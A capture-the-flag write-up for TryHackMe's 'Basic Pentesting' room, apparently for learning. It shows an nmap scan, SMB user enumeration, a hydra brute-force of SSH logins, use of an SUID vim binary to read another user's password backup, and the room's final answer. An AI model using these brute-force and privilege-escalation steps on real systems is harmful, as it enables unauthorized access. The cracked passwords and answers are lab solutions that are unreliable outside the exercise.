# Basic Pentesting

<https://tryhackme.com/room/basicpentestingjt>

## Nmap scan

```sh
nmap -sC -sV -A 10.10.227.73

Nmap scan report for 10.10.227.73
Host is up (0.18s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13?
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http-proxy
|_http-favicon: Apache Tomcat
Device type: general purpose|storage-misc|WAP|broadband router
Running (JUST GUESSING): Linux 3.X|4.X|5.X|2.6.X|2.4.X (92%), HP embedded (91%), Asus embedded (91%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
cpe:/o:linux:linux_kernel:5.4 cpe:/h:hp:p2000_g3 cpe:/h:asus:rt-n56u
cpe:/o:linux:linux_kernel:3.4 cpe:/o:linux:linux_kernel:2.6.22
cpe:/o:linux:linux_kernel:2.4
Aggressive OS guesses: Linux 3.10 - 3.13 (92%), Linux 3.10 - 4.11 (92%),
Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.2 - 3 .5 (92%), Linux 3.2 - 3.8 (92%), Linux 4.2 (92%), Linux 4.4 (92%), Linux 5.4 (92%)
No exact OS matches for host (test conditions non-ideal).

Network Distance: 6 hops
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h19m32s, deviation: 2h18m34s, median: -28s
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC:
<unknown> (unknown)
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2022-08-04T10:37:51-04:00
| smb2-time:
|   date: 2022-08-04T14:37:51
|_  start_date: N/A
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

TRACEROUTE (using port 1025/tcp)
HOP RTT       ADDRESS
1   0.39 ms   192.168.122.1
2   18.89 ms  10.17.0.1
3   ... 5
6   187.58 ms 10.10.227.73

OS and Service detection performed. Please report any incorrect results
at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 230.64 seconds
```

## Open ports

* SSH(22)
* Apache(80)
* SAMBA(139, 445)

## SAMBA enumeration

```bash
enum4linux -a 10.10.227.73
S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)
```

* Users found: `kay`, `jan`

## Brute force SSH login

```sh
hydra -l jan -P /opt/wordlists/rockyou.txt ssh://10.10.227.73
[22][ssh] host: 10.10.227.73   login: jan   password: armando
```

## Enumerating machine

```bash
find / -perm -u=s -type f 2>/dev/null

/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/vim.basic <- unusual SUID binary
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/at
/usr/bin/gpasswd
/usr/bin/newuidmap
/usr/bin/passwd
/bin/su
/bin/ntfs-3g
/bin/ping6
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
```

## Privilege escalation

```bash
-rw------- 1 kay kay 57 Apr 23  2018 pass.bak
```

Since vim is an SUID binary, we can read `pass.bak` using it.

## What is the final password you obtain?

`heresareallystrongpasswordthatfollowsthepasswordpolicy$$`
